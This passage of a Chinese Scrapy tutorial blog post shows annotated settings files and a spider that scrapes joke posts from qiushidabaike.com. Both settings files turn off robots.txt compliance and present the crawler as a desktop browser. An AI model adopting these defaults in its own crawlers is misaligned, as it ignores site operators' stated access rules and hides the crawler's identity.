class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># Scrapy settings for TestSpider project</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># For simplicity, this file contains only settings considered important or</span></span><br><span class=\"line\"><span class=\"comment\"># commonly used. You can find more settings consulting the documentation:</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\">#     https://doc.scrapy.org/en/latest/topics/settings.html</span></span><br><span class=\"line\"><span class=\"comment\">#     https://doc.scrapy.org/en/latest/topics/downloader-middleware.html</span></span><br><span class=\"line\"><span class=\"comment\">#     https://doc.scrapy.org/en/latest/topics/spider-middleware.html</span></span><br><span class=\"line\"> </span><br><span class=\"line\">BOT_NAME = <span class=\"string\">&#x27;TestSpider&#x27;</span></span><br><span class=\"line\"> </span><br><span class=\"line\">SPIDER_MODULES = [<span class=\"string\">&#x27;TestSpider.spiders&#x27;</span>]</span><br><span class=\"line\">NEWSPIDER_MODULE = <span class=\"string\">&#x27;TestSpider.spiders&#x27;</span></span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># Crawl responsibly by identifying yourself (and your website) on the user-agent</span></span><br><span class=\"line\"><span class=\"comment\">#USER_AGENT = &#x27;TestSpider (+http://www.yourdomain.com)&#x27;</span></span><br><span class=\"line\"> </span><br><span class=\"line\">USER_AGENT = <span class=\"string\">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0&#x27;</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># Obey robots.txt rules</span></span><br><span class=\"line\"><span class=\"comment\"># Scrapy框架默认遵守 robots.txt 协议规则，robots规定了一个网站中，哪些地址可以请求，哪些地址不能请求。</span></span><br><span class=\"line\"><span class=\"comment\"># 默认是True，设置为False不遵守这个协议。</span></span><br><span class=\"line\">ROBOTSTXT_OBEY = <span class=\"literal\">False</span></span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># Configure maximum concurrent requests performed by Scrapy (default: 16)</span></span><br><span class=\"line\"><span class=\"comment\"># 配置scrapy的请求连接数，默认会同时并发16个请求。</span></span><br><span class=\"line\"><span class=\"comment\"># CONCURRENT_REQUESTS = 10</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># Configure a delay for requests for the same website (default: 0)</span></span><br><span class=\"line\"><span class=\"comment\"># See https://doc.scrapy.org/en/latest/topics/settings.html#download-delay</span></span><br><span class=\"line\"><span class=\"comment\"># See also autothrottle settings and docs</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># 下载延时，请求和请求之间的间隔，降低爬取速度，default: 0</span></span><br><span class=\"line\"><span class=\"comment\"># DOWNLOAD_DELAY = 3</span></span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># CONCURRENT_REQUESTS_PER_DOMAIN：针对网站(主域名)设置的最大请求并发数。</span></span><br><span class=\"line\"><span class=\"comment\"># CONCURRENT_REQUESTS_PER_IP：某一个IP的最大请求并发数。</span></span><br><span class=\"line\"><span class=\"comment\"># The download delay setting will honor only one of:</span></span><br><span class=\"line\"><span class=\"comment\"># CONCURRENT_REQUESTS_PER_DOMAIN = 16</span></span><br><span class=\"line\"><span class=\"comment\"># CONCURRENT_REQUESTS_PER_IP = 16</span></span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># Disable cookies (enabled by default)</span></span><br><span class=\"line\"><span class=\"comment\"># 是否启用Cookie的配置，默认是可以使用Cookie的。主要是针对一些网站是禁用Cookie的。</span></span><br><span class=\"line\"><span class=\"comment\"># COOKIES_ENABLED = False</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># Disable Telnet Console (enabled by default)</span></span><br><span class=\"line\"><span class=\"comment\">#TELNETCONSOLE_ENABLED = False</span></span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># Override the default request headers:</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># 配置默认的请求头Headers.</span></span><br><span class=\"line\"><span class=\"comment\"># DEFAULT_REQUEST_HEADERS = &#123;</span></span><br><span class=\"line\"><span class=\"comment\">#   &#x27;Accept&#x27;: &#x27;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#x27;,</span></span><br><span class=\"line\"><span class=\"comment\">#   &#x27;Accept-Language&#x27;: &#x27;en&#x27;,</span></span><br><span class=\"line\"><span class=\"comment\"># &#125;</span></span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># Enable or disable spider middlewares</span></span><br><span class=\"line\"><span class=\"comment\"># See https://doc.scrapy.org/en/latest/topics/spider-middleware.html</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># 配置自定义爬虫中间件，scrapy也默认启用了一些爬虫中间件，可以在这个配置中关闭。</span></span><br><span class=\"line\"><span class=\"comment\"># SPIDER_MIDDLEWARES = &#123;</span></span><br><span class=\"line\"><span class=\"comment\">#    &#x27;TestSpider.middlewares.TestspiderSpiderMiddleware&#x27;: 543,</span></span><br><span class=\"line\"><span class=\"comment\"># &#125;</span></span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># 下载中间件，配置自定义的中间件或者取消Scrapy默认启用的中间件。</span></span><br><span class=\"line\"><span class=\"comment\"># Enable or disable downloader middlewares</span></span><br><span class=\"line\"><span class=\"comment\"># See https://doc.scrapy.org/en/latest/topics/downloader-middleware.html</span></span><br><span class=\"line\"><span class=\"comment\"># DOWNLOADER_MIDDLEWARES = &#123;</span></span><br><span class=\"line\"><span class=\"comment\">#    &#x27;TestSpider.middlewares.TestspiderDownloaderMiddleware&#x27;: 543,</span></span><br><span class=\"line\"><span class=\"comment\"># &#125;</span></span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># Enable or disable extensions</span></span><br><span class=\"line\"><span class=\"comment\"># See https://doc.scrapy.org/en/latest/topics/extensions.html</span></span><br><span class=\"line\"><span class=\"comment\"># EXTENSIONS = &#123;</span></span><br><span class=\"line\"><span class=\"comment\">#    &#x27;scrapy.extensions.telnet.TelnetConsole&#x27;: None,</span></span><br><span class=\"line\"><span class=\"comment\"># &#125;</span></span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># Configure item pipelines</span></span><br><span class=\"line\"><span class=\"comment\"># See https://doc.scrapy.org/en/latest/topics/item-pipeline.html</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># 配置自定义的PIPELINES，或者取消PIPELINES默认启用的中间件。</span></span><br><span class=\"line\"><span class=\"comment\"># ITEM_PIPELINES = &#123;</span></span><br><span class=\"line\"><span class=\"comment\">#    &#x27;TestSpider.pipelines.TestspiderPipeline&#x27;: 300,</span></span><br><span class=\"line\"><span class=\"comment\"># &#125;</span></span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># 限速配置</span></span><br><span class=\"line\"><span class=\"comment\"># Enable and configure the AutoThrottle extension (disabled by default)</span></span><br><span class=\"line\"><span class=\"comment\"># See https://doc.scrapy.org/en/latest/topics/autothrottle.html</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># 是否开启自动限速</span></span><br><span class=\"line\"><span class=\"comment\"># AUTOTHROTTLE_ENABLED = True</span></span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># The initial download delay</span></span><br><span class=\"line\"><span class=\"comment\"># 配置初始url的下载延时</span></span><br><span class=\"line\"><span class=\"comment\"># AUTOTHROTTLE_START_DELAY = 5</span></span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># The maximum download delay to be set in case of high latencies</span></span><br><span class=\"line\"><span class=\"comment\"># 配置最大请求时间</span></span><br><span class=\"line\"><span class=\"comment\"># AUTOTHROTTLE_MAX_DELAY = 60</span></span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># 配置请求和请求之间的下载间隔，单位是秒</span></span><br><span class=\"line\"><span class=\"comment\"># The average number of requests Scrapy should be sending in parallel to</span></span><br><span class=\"line\"><span class=\"comment\"># each remote server</span></span><br><span class=\"line\"><span class=\"comment\"># AUTOTHROTTLE_TARGET_CONCURRENCY = 1.0</span></span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># Enable showing throttling stats for every response received:</span></span><br><span class=\"line\"><span class=\"comment\"># AUTOTHROTTLE_DEBUG = False</span></span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># 关于Http缓存的配置，默认是不启用。</span></span><br><span class=\"line\"><span class=\"comment\"># 对于同一个页面的请求进行数据的缓存，如果后续还有相同的请求，直接从缓存中进行获取。</span></span><br><span class=\"line\"><span class=\"comment\"># Enable and configure HTTP caching (disabled by default)</span></span><br><span class=\"line\"><span class=\"comment\"># See https://doc.scrapy.org/en/latest/topics/downloader-middleware.html#httpcache-middleware-settings</span></span><br><span class=\"line\"><span class=\"comment\">#HTTPCACHE_ENABLED = True</span></span><br><span class=\"line\"><span class=\"comment\">#HTTPCACHE_EXPIRATION_SECS = 0</span></span><br><span class=\"line\"><span class=\"comment\">#HTTPCACHE_DIR = &#x27;httpcache&#x27;</span></span><br><span class=\"line\"><span class=\"comment\">#HTTPCACHE_IGNORE_HTTP_CODES = []</span></span><br><span class=\"line\"><span class=\"comment\">#HTTPCACHE_STORAGE = &#x27;scrapy.extensions.httpcache.FilesystemCacheStorage&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"scrapy爬虫之spider类（示例-一：爬取糗事百科）\"><a href=\"#scrapy爬虫之spider类（示例-一：爬取糗事百科）\" class=\"headerlink\" title=\"scrapy爬虫之spider类（示例 一：爬取糗事百科）\"></a>scrapy爬虫之spider类（示例 一：爬取糗事百科）</h3><ul>\n<li>创建爬虫项目：scrapy startproject xiushi</li>\n<li>创建爬虫文件:   scrapy genSpider xiushiSpider  qiushidabaike.com</li>\n</ul>\n<h4 id=\"item-部分\"><a href=\"#item-部分\" class=\"headerlink\" title=\"item 部分\"></a>item 部分</h4><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Define here the models for your scraped items</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># See documentation in:</span></span><br><span class=\"line\"><span class=\"comment\"># https://doc.scrapy.org/en/latest/topics/items.html</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> scrapy</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">XiushiItem</span>(<span class=\"params\">scrapy.Item</span>):</span></span><br><span class=\"line\">    <span class=\"comment\"># define the fields for your item here like:</span></span><br><span class=\"line\">    <span class=\"comment\"># name = scrapy.Field()</span></span><br><span class=\"line\">    title = scrapy.Field()</span><br><span class=\"line\">    text = scrapy.Field()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"setting-部分\"><a href=\"#setting-部分\" class=\"headerlink\" title=\"setting 部分\"></a>setting 部分</h4><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Scrapy settings for xiushi project</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># For simplicity, this file contains only settings considered important or</span></span><br><span class=\"line\"><span class=\"comment\"># commonly used. You can find more settings consulting the documentation:</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\">#     https://doc.scrapy.org/en/latest/topics/settings.html</span></span><br><span class=\"line\"><span class=\"comment\">#     https://doc.scrapy.org/en/latest/topics/downloader-middleware.html</span></span><br><span class=\"line\"><span class=\"comment\">#     https://doc.scrapy.org/en/latest/topics/spider-middleware.html</span></span><br><span class=\"line\"></span><br><span class=\"line\">BOT_NAME = <span class=\"string\">&#x27;xiushi&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">SPIDER_MODULES = [<span class=\"string\">&#x27;xiushi.spiders&#x27;</span>]</span><br><span class=\"line\">NEWSPIDER_MODULE = <span class=\"string\">&#x27;xiushi.spiders&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Crawl responsibly by identifying yourself (and your website) on the user-agent</span></span><br><span class=\"line\"><span class=\"comment\"># USER_AGENT = &#x27;xiushi (+http://www.yourdomain.com)&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Obey robots.txt rules</span></span><br><span class=\"line\">ROBOTSTXT_OBEY = <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Configure maximum concurrent requests performed by Scrapy (default: 16)</span></span><br><span class=\"line\"><span class=\"comment\"># CONCURRENT_REQUESTS = 32</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Configure a delay for requests for the same website (default: 0)</span></span><br><span class=\"line\"><span class=\"comment\"># See https://doc.scrapy.org/en/latest/topics/settings.html#download-delay</span></span><br><span class=\"line\"><span class=\"comment\"># See also autothrottle settings and docs</span></span><br><span class=\"line\">DOWNLOAD_DELAY = <span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"comment\"># The download delay setting will honor only one of:</span></span><br><span class=\"line\"><span class=\"comment\"># CONCURRENT_REQUESTS_PER_DOMAIN = 16</span></span><br><span class=\"line\"><span class=\"comment\"># CONCURRENT_REQUESTS_PER_IP = 16</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Disable cookies (enabled by default)</span></span><br><span class=\"line\"><span class=\"comment\"># COOKIES_ENABLED = False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Disable Telnet Console (enabled by default)</span></span><br><span class=\"line\"><span class=\"comment\"># TELNETCONSOLE_ENABLED = False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Override the default request headers:</span></span><br><span class=\"line\">DEFAULT_REQUEST_HEADERS = &#123;</span><br><span class=\"line\">    <span class=\"string\">&#x27;Accept&#x27;</span>: <span class=\"string\">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;Accept-Language&#x27;</span>: <span class=\"string\">&#x27;en&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;User-Agent&#x27;</span>: <span class=\"string\">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) &#x27;</span></span><br><span class=\"line\">                  <span class=\"string\">&#x27;Chrome/80.0.3987.163 Safari/537.36 &#x27;</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Enable or disable spider middlewares</span></span><br><span class=\"line\"><span class=\"comment\"># See https://doc.scrapy.org/en/latest/topics/spider-middleware.html</span></span><br><span class=\"line\"><span class=\"comment\"># SPIDER_MIDDLEWARES = &#123;</span></span><br><span class=\"line\"><span class=\"comment\">#    &#x27;xiushi.middlewares.XiushiSpiderMiddleware&#x27;: 543,</span></span><br><span class=\"line\"><span class=\"comment\"># &#125;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Enable or disable downloader middlewares</span></span><br><span class=\"line\"><span class=\"comment\"># See https://doc.scrapy.org/en/latest/topics/downloader-middleware.html</span></span><br><span class=\"line\"><span class=\"comment\"># DOWNLOADER_MIDDLEWARES = &#123;</span></span><br><span class=\"line\"><span class=\"comment\">#    &#x27;xiushi.middlewares.XiushiDownloaderMiddleware&#x27;: 543,</span></span><br><span class=\"line\"><span class=\"comment\"># &#125;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Enable or disable extensions</span></span><br><span class=\"line\"><span class=\"comment\"># See https://doc.scrapy.org/en/latest/topics/extensions.html</span></span><br><span class=\"line\"><span class=\"comment\"># EXTENSIONS = &#123;</span></span><br><span class=\"line\"><span class=\"comment\">#    &#x27;scrapy.extensions.telnet.TelnetConsole&#x27;: None,</span></span><br><span class=\"line\"><span class=\"comment\"># &#125;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Configure item pipelines</span></span><br><span class=\"line\"><span class=\"comment\"># See https://doc.scrapy.org/en/latest/topics/item-pipeline.html</span></span><br><span class=\"line\">ITEM_PIPELINES = &#123;</span><br><span class=\"line\">   <span class=\"string\">&#x27;xiushi.pipelines.XiushiPipeline&#x27;</span>: <span class=\"number\">300</span>,</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Enable and configure the AutoThrottle extension (disabled by default)</span></span><br><span class=\"line\"><span class=\"comment\"># See https://doc.scrapy.org/en/latest/topics/autothrottle.html</span></span><br><span class=\"line\"><span class=\"comment\"># AUTOTHROTTLE_ENABLED = True</span></span><br><span class=\"line\"><span class=\"comment\"># The initial download delay</span></span><br><span class=\"line\"><span class=\"comment\"># AUTOTHROTTLE_START_DELAY = 5</span></span><br><span class=\"line\"><span class=\"comment\"># The maximum download delay to be set in case of high latencies</span></span><br><span class=\"line\"><span class=\"comment\"># AUTOTHROTTLE_MAX_DELAY = 60</span></span><br><span class=\"line\"><span class=\"comment\"># The average number of requests Scrapy should be sending in parallel to</span></span><br><span class=\"line\"><span class=\"comment\"># each remote server</span></span><br><span class=\"line\"><span class=\"comment\"># AUTOTHROTTLE_TARGET_CONCURRENCY = 1.0</span></span><br><span class=\"line\"><span class=\"comment\"># Enable showing throttling stats for every response received:</span></span><br><span class=\"line\"><span class=\"comment\"># AUTOTHROTTLE_DEBUG = False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Enable and configure HTTP caching (disabled by default)</span></span><br><span class=\"line\"><span class=\"comment\"># See https://doc.scrapy.org/en/latest/topics/downloader-middleware.html#httpcache-middleware-settings</span></span><br><span class=\"line\"><span class=\"comment\"># HTTPCACHE_ENABLED = True</span></span><br><span class=\"line\"><span class=\"comment\"># HTTPCACHE_EXPIRATION_SECS = 0</span></span><br><span class=\"line\"><span class=\"comment\"># HTTPCACHE_DIR = &#x27;httpcache&#x27;</span></span><br><span class=\"line\"><span class=\"comment\"># HTTPCACHE_IGNORE_HTTP_CODES = []</span></span><br><span class=\"line\"><span class=\"comment\"># HTTPCACHE_STORAGE = &#x27;scrapy.extensions.httpcache.FilesystemCacheStorage&#x27;</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"spider-部分\"><a href=\"#spider-部分\" class=\"headerlink\" title=\"spider 部分\"></a>spider 部分</h4><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> scrapy</span><br><span class=\"line\"><span class=\"keyword\">from</span> xiushi.items <span class=\"keyword\">import</span> XiushiItem</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">XiushispiderSpider</span>(<span class=\"params\">scrapy.Spider</span>):</span></span><br><span class=\"line\">    name = <span class=\"string\">&#x27;xiushiSpider&#x27;</span></span><br><span class=\"line\">    allowed_domains = [<span class=\"string\">&#x27;qiushidabaike.com&#x27;</span>]</span><br><span class=\"line\">    start_urls = [<span class=\"string\">&#x27;http://qiushidabaike.com/index_1.html&#x27;</span>]</span><br><span class=\"line\">    base_domain = <span class=\"string\">&#x27;http://qiushidabaike.com&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">parse</span>(<span class=\"params\">self, response</span>):</span></span><br><span class=\"line\">        duanzi = response.xpath(<span class=\"string\">&#x27;//div[@class=&quot;main-left fl&quot;]//dl&#x27;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">for</span> it <span class=\"keyword\">in</span> duanzi:</span><br><span class=\"line\">            title = it.xpath(<span class=\"string\">&#x27;./dt/span/a/text()&#x27;</span>).get().strip()</span><br><span class=\"line\">            text = it.xpath(<span class=\"string\">&#x27;./dd[@class=&quot;content&quot;]//text()&#x27;</span>).getall()</span><br><span class=\"line\">            text = <span class=\"string\">&quot;&quot;</span>.join(text).strip()</span><br><span class=\"line\">            item = XiushiItem(title=title, text=text)</span><br><span class=\"line\">            <span class=\"keyword\">yield</span> item</span><br><span class=\"line\">        <span class=\"comment\"># 进行翻页操作</span></span><br><span class=\"line\">        next_url = response.xpath(<span class=\"string\">&#x27;//div[@class=&quot;page&quot;]//a[@class=&quot;next&quot;]/@href&#x27;</span>).get()</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> next_url:</span><br><span class=\"line\">            <span class=\"keyword\">return</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">yield</span> scrapy.Request(self.base_domain+next_url, callback=self.parse)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"pipelines-部分\"><a href=\"#pipelines-部分\" class=\"headerlink\" title=\"pipelines 部分\"></a>pipelines 部分</h4><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span 